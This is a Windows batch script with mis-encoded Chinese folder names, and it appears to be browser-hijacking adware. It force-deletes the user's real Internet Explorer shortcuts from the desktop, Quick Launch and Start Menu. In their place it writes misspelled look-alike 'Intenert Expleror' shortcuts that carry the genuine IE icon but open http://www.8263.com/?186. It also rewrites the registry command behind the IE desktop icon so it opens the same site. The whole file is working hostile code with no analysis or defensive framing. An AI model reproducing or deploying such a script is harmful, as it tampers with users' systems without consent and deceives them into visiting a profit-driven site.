del "%userprofile%\����\Internet Explorer.lnk" /f/q/a
del "%userprofile%\����\Internet Exp1orer.lnk" /f/q/a
del "%userprofile%\����\Internet Explorer.lnk"  /f/q/a
del "%userprofile%\����\IEXPLORE.lnk" /f/q/a
del "%userprofile%\����\IEXPLOREr.lnk" /f/q/a
del "%userprofile%\����\Internet Exp*.lnk" /f/q/a

 
del "%userprofile%\����ʼ���˵�\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����ʼ���˵�\����\*Internet*.lnk" /f/q/a

del "%userprofile%\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����\Internet *.url"  /f/q/a
del "C:\Documents and Settings\All Users\����\Internet *.url" /f/q/a
del "C:\Documents and Settings\All Users\����\Internet *.lnk" /f/q/a


del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.url" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.lnk" /f/q/a


del   "%userprofile%\����ʼ���˵�\Internet Explorer.url"   /f/q/a
del   "%userprofile%\����ʼ���˵�\Internet Explorer.lnk"  /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\Internet Explorer.url" /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\Internet Explorer.lnk" /f/q/a

@echo off
echo [InternetShortcut] >"%ALLUSERSPROFILE%\����\Intenert Expleror.url"
echo URL=http://www.8263.com/?186>>"%ALLUSERSPROFILE%\����\Intenert Expleror.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%ALLUSERSPROFILE%\����\Intenert Expleror.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%ALLUSERSPROFILE%\����\Intenert Expleror.url"
::IconFile=%cd%\

@echo off
echo [InternetShortcut] >"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Intenert Expleror.url"
echo URL=http://www.8263.com/?186>>"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Intenert Expleror.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Intenert Expleror.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Intenert Expleror.url"
::IconFile=%cd%\

@echo off
echo [InternetShortcut] >"%ALLUSERSPROFILE%\����ʼ���˵�\Intenert Expleror.url"
echo URL=http://www.8263.com/?186>>"%ALLUSERSPROFILE%\����ʼ���˵�\Intenert Expleror.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%ALLUSERSPROFILE%\����ʼ���˵�\Intenert Expleror.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%ALLUSERSPROFILE%\����ʼ���˵�\Intenert Expleror.url"
::IconFile=%cd%\

@reg del "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v  
@reg add "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v "" /d "%ProgramFiles%\Internet Explorer\iexplore.exe http://www.8263.com/?186" /f

del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorer �����.lnk" /f/q/a
del "%userprofile%\����\*Internet*.lnk" /f/q/a

@echo off
echo [InternetShortcut] >"%ALLUSERSPROFILE%\����ʼ���˵�\����\Intenert Expleror.url"
echo URL=http://www.8263.com/?186>>"%ALLUSERSPROFILE%\����ʼ���˵�\����\Intenert Expleror.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%ALLUSERSPROFILE%\����ʼ���˵�\����\Intenert Expleror.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%ALLUSERSPROFILE%\����ʼ���˵�\����\Intenert Expleror.url"
::IconFile=%cd%\
